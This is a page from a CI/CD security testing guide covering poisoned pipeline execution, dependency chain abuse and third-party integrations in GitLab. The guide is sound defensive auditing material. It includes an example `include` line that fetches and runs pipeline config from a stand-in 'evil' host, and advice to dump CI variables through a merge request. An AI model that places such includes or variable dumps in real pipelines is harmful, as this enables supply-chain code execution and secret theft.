# GitLab · Pipeline Execution & Dependencies

> CICD-SEC [4 Poisoned Pipeline Execution](../_cicd-base/CICD-SEC-04-Poisoned-Pipeline-Execution.md),
> [3 Dependency Chain Abuse](../_cicd-base/CICD-SEC-03-Dependency-Chain-Abuse.md),
> [8 Ungoverned 3rd-Party Services](../_cicd-base/CICD-SEC-08-Ungoverned-Usage-of-3rd-Party-Services.md),
> projected onto GitLab CI/CD.

## CICD-SEC-4 — Poisoned Pipeline Execution (PPE)  ⭐
- **Setting/sink:**
  - **MR pipelines from forks/branches** running the submitted `.gitlab-ci.yml` or
    referenced scripts → attacker code runs with the pipeline identity (Direct/
    Indirect PPE).
  - **Shell-executor shared runners** → job commands run directly on the runner
    host = RCE + persistence + other tenants' data.
  - `rules`/`only` that expose protected variables to MR pipelines.
- **How to test:** open an MR editing `.gitlab-ci.yml` (or a referenced
  `Makefile`/script) to echo a canary / dump non-protected variables; check runner
  executor type (`glab api projects/<id>/runners`).
- **Positive (secure):** MR pipelines don't get protected secrets; fork-MR
  pipelines require maintainer approval to run; **Docker/isolated** executors,
  not shell; CI config edits go through review.
- **Negative (vulnerable):** your MR's code executes in CI with access to
  variables, or runs on a shell runner → secret exfil / runner RCE / cross-tenant.

## CICD-SEC-3 — Dependency chain abuse
- **Setting/sink:** `include:` of **remote** pipeline templates/components by
  mutable ref; unpinned container `image:`; dependency confusion in package pulls.
  ```yaml
  include: { remote: 'https://evil/ci.yml' }     # pulls+runs external pipeline config
  ```
- **Positive (secure):** includes pinned to internal/immutable refs; images pinned
  by digest; private registry scoping; dependency scanning enabled.
- **Negative (vulnerable):** a mutable remote include / `image:latest` can be
  swapped to run attacker config in the pipeline → supply-chain RCE.

## CICD-SEC-8 — Ungoverned 3rd-party services
- **Setting/sink:** project/group **integrations** (webhooks, external CI, OAuth
  apps), and **instance/group shared runners** usable by untrusted projects.
  ```sh
  glab api projects/<id>/integrations ; glab api projects/<id>/hooks
  ```
- **Positive (secure):** integrations reviewed/least-scope; shared runners
  restricted for public/forked projects. **Negative (vulnerable):** broad
  webhooks/integrations or shared shell runners widen blast radius.

---
*Base: [CICD-SEC 4](../_cicd-base/CICD-SEC-04-Poisoned-Pipeline-Execution.md) ·
[3](../_cicd-base/CICD-SEC-03-Dependency-Chain-Abuse.md) ·
[8](../_cicd-base/CICD-SEC-08-Ungoverned-Usage-of-3rd-Party-Services.md). Next:
[Credentials, Artifacts & Logging](03-credentials-artifacts-logging.md).*
